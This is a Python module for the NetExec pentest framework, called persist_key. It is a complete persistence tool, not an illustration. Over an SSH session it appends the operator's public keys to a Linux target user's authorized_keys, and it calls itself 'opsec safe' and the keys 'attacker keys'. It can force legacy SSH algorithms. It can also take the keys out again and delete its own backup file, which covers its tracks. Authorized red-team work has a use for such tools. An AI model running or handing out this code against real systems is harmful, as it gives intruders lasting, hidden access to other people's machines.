# ~/.nxc/modules/persist_key.py
import os
import time

class NXCModule:
    name = "persist_key"
    description = "Inject or remove public key(s) in ~/.ssh/authorized_keys for persistence (Linux)"
    supported_protocols = ["ssh"]
    opsec_safe = True
    multiple_hosts = False

    def options(self, context, module_options):
        self.pubkey_opt = module_options.get("PUBKEY", "").strip()
        self.target_user = module_options.get("USER", "").strip()
        self.backup = str(module_options.get("BACKUP", "true")).lower() in ("1", "true", "yes", "y")
        self.remove_raw = module_options.get("REMOVE", "false").lower()

        # Determine remove mode
        if self.remove_raw in ("1", "true", "yes", "y"):
            self.remove_mode = "key"
        elif self.remove_raw == "backup":
            self.remove_mode = "backup"
        else:
            self.remove_mode = None

        # Legacy SSH options
        self.kex = module_options.get("KEX")
        self.hostkey = module_options.get("HOSTKEY")

        if self.kex:
            algos = [x.strip() for x in self.kex.split(",") if x.strip()]
            context.log.display(f"[ssh_persist_key] Forcing KEX algos: {algos}")
            from paramiko.transport import Transport
            Transport._preferred_kex = algos

        if self.hostkey:
            algos = [x.strip() for x in self.hostkey.split(",") if x.strip()]
            context.log.display(f"[ssh_persist_key] Forcing hostkey algos: {algos}")
            from paramiko.transport import Transport
            Transport._preferred_pubkeys = algos

        # Auto-discover keys if PUBKEY not given
        if not self.pubkey_opt:
            default_keys = ["id_rsa.pub", "id_ecdsa.pub", "id_ed25519.pub", "id_dsa.pub"]
            found_keys = []
            for k in default_keys:
                candidate = os.path.expanduser(f"~/.ssh/{k}")
                if os.path.isfile(candidate):
                    found_keys.append(candidate)
            if not found_keys:
                raise ValueError("[ssh_persist_key] No default public keys found in ~/.ssh")
            self.pubkey_opt = found_keys
        else:
            self.pubkey_opt = [self.pubkey_opt]

    def on_login(self, context, connection):
        # Only Linux
        if getattr(connection, "server_os_platform", "").lower() != "linux":
            context.log.error("[ssh_persist_key] Target OS not Linux – aborting.")
            return

        if not hasattr(connection, "conn") or connection.conn is None:
            context.log.error("[ssh_persist_key] No SSH client available.")
            return

        ssh_user = getattr(connection, "username", None)
        if not self.target_user:
            self.target_user = ssh_user or self._remote_whoami(connection) or "root"

        home = self._remote_user_home(connection, self.target_user)
        if not home:
            context.log.error(f"[ssh_persist_key] Unable to resolve home dir for user '{self.target_user}'.")
            return

        ssh_dir = f"{home}/.ssh"
        auth_keys = f"{ssh_dir}/authorized_keys"

        try:
            sftp = connection.conn.open_sftp()
            self._ensure_dir(context, connection, sftp, ssh_dir, owner=self.target_user)

            # Read current authorized_keys
            existing = ""
            try:
                with sftp.file(auth_keys, "r") as f:
                    existing = f.read().decode("utf-8", errors="ignore")
            except IOError:
                existing = ""

            # -------------------- REMOVE logic --------------------
            if self.remove_mode:
                modified = existing
                removed_any = False

                # Remove all attacker keys
                for pubkey_path in self.pubkey_opt:
                    key_id = " ".join(self._load_pubkey_text(context, pubkey_path).split()[:2])
                    if key_id in modified:
                        modified = self._remove_key_lines(modified, key_id)
                        context.log.success(f"[ssh_persist_key] Removed key {pubkey_path} from authorized_keys.")
                        removed_any = True
                    else:
                        context.log.info(f"[ssh_persist_key] Key {pubkey_path} not present; nothing to remove.")

                if removed_any:
                    self._write_with_perms(connection, sftp, auth_keys, modified, owner=self.target_user)

                    # DELETE backup if REMOVE=backup
                    if self.remove_mode == "backup":
                        try:
                            _, stdout, _ = connection.conn.exec_command(
                                f"ls -1t {ssh_dir}/authorized_keys.bak-* 2>/dev/null | head -n1"
                            )
                            backup_file = stdout.read().decode().strip()
                            if backup_file:
                                _, stdout1, _ = connection.conn.exec_command(
                                    f"sha256sum {self._q(auth_keys)}"
                                )
                                auth_sum = stdout1.read().decode().split()[0]
                                _, stdout2, _ = connection.conn.exec_command(
                                    f"sha256sum {self._q(backup_file)}"
                                )
                                bak_sum = stdout2.read().decode().split()[0]
                                if auth_sum == bak_sum:
                                    context.log.info(f"[ssh_persist_key] Backup verified; deleting {backup_file}")
                                    connection.conn.exec_command(f"rm -f {self._q(backup_file)}")
                                else:
                                    context.log.info(f"[ssh_persist_key] Backup mismatch; not deleting {backup_file}")
                        except Exception as e:
                            context.log.info(f"[ssh_persist_key] Error verifying/deleting backup: {e}")

                sftp.close()
                return  # skip ADD logic

            # -------------------- ADD logic --------------------
            for pubkey_path in self.pubkey_opt:
                pubkey_text = self._load_pubkey_text(context, pubkey_path)
                if not pubkey_text.startswith("ssh-"):
                    context.log.error(f"[ssh_persist_key] {pubkey_path} does not look like a valid SSH public key.")
                    continue
                key_id = " ".join(pubkey_text.split()[:2])
                if key_id in existing:
                    context.log.success(f"[ssh_persist_key] Key {pubkey_path} already present in authorized_keys.")
                    continue

                # Backup before first modification
                if self.backup and existing:
                    ts = time.strftime("%Y%m%d-%H%M%S")
                    backup_path = f"{auth_keys}.bak-{ts}"
                    try:
                        connection.conn.exec_command(
                            f"cp -p {self._q(auth_keys)} {self._q(backup_path)} 2>/dev/null || true"
                        )
                        context.log.info(f"[ssh_persist_key] Backed up authorized_keys -> {backup_path}")
                    except Exception:
                        pass

                # Append key to existing content
                existing = (existing.rstrip("\n") + "\n" if existing else "") + pubkey_text.strip() + "\n"

            # Write all added keys at once
            self._write_with_perms(connection, sftp, auth_keys, existing, owner=self.target_user)
            context.log.success(f"[ssh_persist_key] Added {len(self.pubkey_opt)} key(s) to authorized_keys.")

        except Exception as e:
            context.log.error(f"[ssh_persist_key] Error: {e}")

    # -------------------- helpers --------------------
    def _load_pubkey_text(self, context, pubkey_opt):
        if pubkey_opt.startswith("ssh-"):
            return pubkey_opt.strip()
        path = os.path.expanduser(pubkey_opt)
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return f.read().strip()

    def _remote_whoami(self, connection):
        try:
            _, stdout, _ = connection.conn.exec_command("whoami 2>/dev/null || id -un 2>/dev/null")
            return stdout.read().decode().strip() or None
        except Exception:
            return None

    def _remote_user_home(self, connection, user):
        try:
            _, stdout, _ = connection.conn.exec_command(f"getent passwd {self._q(user)} | cut -d: -f6")
            out = stdout.read().decode().strip()
            if out:
                return out
        except Exception:
            pass
        try:
            _, stdout, _ = connection.conn.exec_command(f"eval echo ~{self._q(user)}")
            return stdout.read().decode().strip() or None
        except Exception:
            return None

    def _ensure_dir(self, context, connection, sftp, path, owner):
        try:
            connection.conn.exec_command(f"mkdir -p {self._q(path)} && chmod 700 {self._q(path)}")
            connection.conn.exec_command(
                f"id -u {self._q(owner)} >/dev/null 2>&1 && chown {self._q(owner)}:{self._q(owner)} {self._q(path)} 2>/dev/null || true"
            )
        except Exception as e:
            context.log.info(f"[ssh_persist_key] mkdir/chmod note: {e}")

    def _write_with_perms(self, connection, sftp, path, content, owner):
        tmp = f"{path}.tmp-{int(time.time())}"
        with sftp.file(tmp, "w") as f:
            f.write(content.encode("utf-8"))
        connection.conn.exec_command(
            f"mv -f {self._q(tmp)} {self._q(path)} && chmod 600 {self._q(path)} && "
            f"(chown {self._q(owner)}:{self._q(owner)} {self._q(path)} 2>/dev/null || true)"
        )

    def _remove_key_lines(self, existing, key_id):
        lines = existing.splitlines()
        keep = []
        for ln in lines:
            parts = ln.strip().split()
            if len(parts) >= 2 and " ".join(parts[:2]) == key_id:
                continue
            keep.append(ln)
        return "\n".join(keep).rstrip("\n") + ("\n" if keep else "")

    def _q(self, s):
        return "'" + s.replace("'", "'\\''") + "'"
